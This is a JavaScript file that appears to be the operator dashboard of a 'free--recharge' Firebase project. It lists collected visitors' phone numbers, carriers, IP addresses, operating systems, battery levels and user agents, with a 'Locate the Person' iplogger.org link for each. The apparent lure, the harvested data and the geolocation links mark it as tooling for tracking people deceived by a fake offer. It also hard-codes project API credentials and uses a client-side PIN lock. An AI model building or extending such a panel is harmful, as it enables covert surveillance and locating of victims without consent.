const firebaseConfig = {
  apiKey: "AIzaSyDywjRLiR6ICXGjKbgSvawgQdtHMISYpw8",
  authDomain: "free--recharge.firebaseapp.com",
  projectId: "free--recharge",
  storageBucket: "free--recharge.appspot.com",
  messagingSenderId: "488699485237",
  appId: "1:488699485237:web:e39a1b373e1143c1d5a57c"
};

 const _= e =>document.querySelector(e)
 const __=e=>document.createElement(e)
firebase.initializeApp(firebaseConfig);
var database = firebase.database();
var NofDev = 0
var NofVisitors = 0
var main = _('.main')


// setTimeout(function() {
//   // code to be executed
//   database.ref().once('value', (snapshot) => {
//     // Update the data in your application
    
//     history.go(0);
//   });
// }, 5000);

var refreshBox = _('#checkbox')

firebase.database().ref().on("value", function(snapshot) {
      snapshot.forEach(function(childSnapshot) {
        var key = childSnapshot.key;
        var value = childSnapshot.val();
        console.log("Tags: " + key + "User Name: " + key, 'Battery Leve :' + value.Battery , 'OS: ' + value.OS, 'User Agent: ' + value.UserAgent);
        
        // Do something with the tag and value (e.g., display them in the HTML)
        if (key == 'AppEdit') {
          const Password = value.Password
          // alert(Password)
          console.log('Passs ' + Password)
          
          
             //set lock
          const lockMain = __('div')
          lockMain.className='lockMain'
          lockMain.id='lockMain'
          main.appendChild(lockMain)
          
          const lockCard = __('div')
          lockCard.className='lockCard'
          lockMain.appendChild(lockCard)
          
          const lockTitle = __('h2')
          lockTitle.className='lockTitle'
          lockCard.appendChild(lockTitle)
          lockTitle.innerText='Admin Locked'
          
          const lockInput = __('input')
          lockInput.className = 'lockInput'
          lockCard.appendChild(lockInput)
          lockInput.placeholder = 'Enter The Pin'
          lockInput.type='number'
          
          const unlockBtn = __('button')
          unlockBtn.className = 'unlockBtn'
          lockCard.appendChild(unlockBtn)
          unlockBtn.innerText = 'OK'

          const lockInfo = __('p')
          unlockBtn.className = 'lockInfo'
          lockCard.appendChild(lockInfo)
          lockInfo.innerText = 'Admin Locked By Updation. if That Not Locked,You can see That Too many buggs '
          
          
          
          unlockBtn.addEventListener('click', ()=>{
            if (lockInput.value == Password) {
              lockMain.classList.toggle('lockMainUnlocked')
              refreshBox.style.visibility='visible'
            } else {
              lockInput.style.color='red'
              
            }
            
          
          })
          
          if (Password == '') {
          lockMain.remove()
          }
        
        
         //
          if (localStorage.getItem('refresh') == 'true') {
            lockMain.classList.toggle('lockMain')
            refreshBox.style.visibility='visible'
            lockCard.classList.toggle('lockCardHide')
          } else {
            
            if (localStorage.getItem('refresh') == 'false') {
            refreshBox.style.visibility='visible'
          } else {
            refreshBox.style.visibility='hidden'
          }
            
          }
          
          
          
          
          
          
        }else{
          
          
          
          if (key == 'visitors') {
          //   NofVisitors++
          // document.querySelector('.title').innerText='Totel visitors: '+NofVisitors
          
          
          } else {
            
            if (key == 'Password') {
          
          } else {
          
            
          NofDev ++
        document.querySelector('.title').innerText='Totel Users: '+NofDev
        
        const card = document.createElement('div')
        card.className='card'
        main.appendChild(card)
        
        const hori_layout = __('div');
        hori_layout.className='hori_layout';
        card.appendChild(hori_layout);
        
        const card_sm = document.createElement('div')
        card_sm.className='card_sm'
        hori_layout.appendChild(card_sm)
        
        const title= document.createElement('h1')
        title.className='numH1'
        card_sm.appendChild(title)
        title.innerText=NofDev
        
        const userName = document.createElement('h3')
        hori_layout.appendChild(userName)
        userName.innerText=key
        //2
        const dataSec = __('div')
        dataSec.className='dataSec'
        card.appendChild(dataSec)
        
        const hori_layout2 = __('div')
        hori_layout2.className='hori_layout'
        dataSec.appendChild(hori_layout2)
        
        const number = __('label')
        number.className='key'
        hori_layout2.appendChild(number)
        number.innerText= 'Number : '
        
        const numVal = __('label')
        numVal.className='value'
        numVal.innerText=value.Number
        hori_layout2.appendChild(numVal)
        
        const hori_layout3 = __('div')
        hori_layout3.className = 'hori_layout'
        dataSec.appendChild(hori_layout3)
        
        const career = __('label')
        career.className = 'key'
        hori_layout3.appendChild(career)
        career.innerText = 'Career : '
        
        const careerVal = __('label')
        careerVal.className = 'value'
        careerVal.innerText = value.Career
        hori_layout3.appendChild(careerVal)
        
        
        const hori_layout4 = __('div')
        hori_layout3.className='hori_layout'
        dataSec.appendChild(hori_layout4)
        
        const IP = __('label')
        IP.className='key'
        hori_layout4.appendChild(IP)
        IP.innerText= 'IP : '
        
        const IPval = __('label')
        IPval.className='value'
        IPval.innerText=value.IP
        hori_layout4.appendChild(IPval)
        const ipLink = __('a')
        ipLink.href= "https://iplogger.org/ip-tracker/?ip="+IPval.innerText
        console.log(IPval.innerText)
        
        
        //ipLink.href='https://iplogger.org/ip-tracker/?ip='+ val.IP;
        ipLink.innerText='Locate the Person'
        hori_layout4.appendChild(ipLink)
        
        const hori_layout5 = __('div')
        hori_layout5.className = 'hori_layout'
        dataSec.appendChild(hori_layout5)
        
        const OS = __('label')
        OS.className = 'key'
        hori_layout5.appendChild(OS)
        OS.innerText = 'Operating System : '
        
        const OSval = __('label')
        OSval.className = 'value'
        OSval.innerText = value.OS
        hori_layout5.appendChild(OSval)
        
        
        const hori_layout6 = __('div')
        hori_layout6.className = 'hori_layout'
        dataSec.appendChild(hori_layout6)
        
        const Battery = __('label')
        Battery.className = 'key'
        hori_layout6.appendChild(Battery)
        Battery.innerText = 'Battery : '
        
        const BatteryVal = __('label')
        BatteryVal.className = 'value'
        BatteryVal.innerText = value.Battery
        hori_layout6.appendChild(BatteryVal)
        
        const hori_layout7 = __('div')
        hori_layout7.className = 'hori_layout'
        dataSec.appendChild(hori_layout7)
        
        const UserAgent = __('label')
        UserAgent.className = 'key'
        hori_layout7.appendChild(UserAgent)
        UserAgent.innerText = 'User Agent : '
        
        const UserAgentVal = __('label')
        UserAgentVal.className = 'value'
        UserAgentVal.innerText = value.UserAgent
        hori_layout7.appendChild(UserAgentVal)
        
        const hori_layout8 = __('div')
        hori_layout8.className = 'hori_layout'
        dataSec.appendChild(hori_layout8)
        
        const JoinedTime = __('label')
        JoinedTime.className = 'key'
        hori_layout8.appendChild(JoinedTime)
        JoinedTime.innerText = 'Joined Time : '
        
        const JoinedTimeVal = __('label')
        JoinedTimeVal.className = 'value'
        JoinedTimeVal.innerText = value.Time
        hori_layout8.appendChild(JoinedTimeVal)
        
        
        // const time = __('label')
        // time.className = 'value'
        // time.innerText = new Date()
        // hori_layout7.appendChild(time)
        
        
        
        
        // const all = __('label')
        // all.innerText='number1'+value.Number,
        // 'IP'+ value.IP,
        // 'OS'+value.OS,
        // 'UA'+value.UserAgent,
        
        // card.appendChild(all)
          }
        }
        }
        
        console.log('------------------')
      });
    });
    
    
    
    
  var refreshStatus = localStorage.getItem('refresh')
  var refreshBox = _('#checkbox')
  refreshBox.style.visibility='hidden'
  
  if (refreshStatus=='') {
    
  } else {
    if (refreshStatus=='true') {
      refreshBox.checked=true
      
      setTimeout(function() {
    history.go(0);
  
}, 5000);

    } else {
      refreshBox.checked=false
    }
  }
  

refreshBox.addEventListener('change',()=>{
  if (refreshBox.checked==true) {
    localStorage.setItem('refresh', 'true')
    
    setTimeout(function() {
  // code to be executed
  if (localStorage.getItem('refresh')=='true') {
    history.go(0);
  } else {
    
  }
    // Update the data in your application
    
    
  
}, 10000);

  } else {
    
    localStorage.setItem('refresh', 'false')
  }
})

//ip get val
function generateUniqueName() {
  var text = "";
  var possible = "AZBXCGLK0";

  for (var i = 0; i < 10; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));
    
    
    var tagName = 'Admin IP ' + text
    console.log(tagName)
    
    fetch('https://api.ipify.org?format=json')
  .then(results => results.json())
  .then(data => database.ref('AppEdit').child(tagName).set(data.ip).then(function() {
        // var dataIp = data.IP
        console.log("Admins  value added successfully!");
        
  }))
  return text;
}

generateUniqueName();



//'https://iplogger.org/ip-tracker/?ip=106.198.196.68'
